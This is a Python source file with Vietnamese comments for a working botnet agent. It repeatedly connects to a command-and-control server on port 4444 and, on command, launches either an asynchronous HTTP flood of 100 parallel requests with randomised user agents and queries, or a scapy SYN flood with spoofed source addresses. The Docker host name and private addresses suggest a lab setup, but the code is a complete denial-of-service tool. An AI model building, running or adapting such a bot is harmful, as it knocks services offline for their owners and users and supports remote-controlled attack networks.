import socket
import threading
import time
import sys
import random
import asyncio
import httpx
from scapy.all import IP, TCP, send

# HTTP flood sử dụng httpx
async def flood_http(target_ip, port, duration):
    print(f"[+] HTTP flood -> {target_ip}:{port} for {duration}s")
    target_url = f"http://{target_ip}:{port}"
    timeout = time.time() + duration

    # List user agents để random hóa
    user_agents = [
        "Mozilla/5.0", "curl/7.68.0", "HttpClient", "python-requests/2.25"
    ]

    async def send_request(client):
        try:
            headers = {
                "User-Agent": random.choice(user_agents)
            }
            path = f"/?q={random.randint(1, 100)}"  # Random hóa query để tránh cache
            response = await client.get(path, headers=headers, timeout=2)
            print(f"Request sent to {target_url}, Code: {response.status_code}, Response: {response}")
        except:
            pass

    async def flood():
        async with httpx.AsyncClient(base_url=target_url, timeout=2) as client:
            while time.time() < timeout:
                tasks = [send_request(client) for _ in range(100)]  # Gửi 100 request song song
                await asyncio.gather(*tasks)

    await flood()

# SYN flood (không thay đổi)
def syn_flood(target_ip, port, duration):
    print(f"[+] SYN flood -> {target_ip}:{port} for {duration}s")
    timeout = time.time() + duration
    while time.time() < timeout:
        # ip = IP(dst=target_ip)
        # tcp = TCP(dport=port, flags="S")
        # pkt = ip/tcp
        ip = IP(src= f"172.30.0.{random.randint(10, 250)}",
                      dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535),
                        dport=port,
                        flags="S",  # SYN
                        seq=random.randint(0, 4294967295))
        pkt = ip / tcp
        print(f"target_ip: {target_ip}, port: {port}, ip: {ip}, tcp: {tcp}, pkt: {pkt}")
        send(pkt, verbose=False)

# Hàm xử lý các lệnh từ C2
def handle_command(cmd):
    # cmd == "HTTP 172.30.0.2 3000 30"
    parts = cmd.strip().split()
    if len(parts) < 4: return

    action, target_ip, port, duration = parts[:4]
    duration = int(duration)
    port = int(port)

    if action.upper() == "HTTP":
        # Thay đổi ở đây: gọi flood_http bằng async
        threading.Thread(target=asyncio.run, args=(flood_http(target_ip, port, duration),)).start()
    elif action.upper() == "SYN":
        threading.Thread(target=syn_flood, args=(target_ip, port, duration)).start()

# Kết nối tới C2 và nhận lệnh
def connect_to_c2():
    print("[*] Connecting to C2...")
    while True:
        try:
            sock = socket.socket()
            sock.connect(("host.docker.internal", 4444))
            print("[*] Connected to C2")

            buffer = ""
            while True:
                data = sock.recv(1024)
                if not data:
                    print("[!] Connection closed by C2")
                    break

                buffer += data.decode()
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    handle_command(line.strip())
        except Exception as e:
            print(f"[!] Exception: {e}")
            print("[!] Retry in 5s...")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_c2()
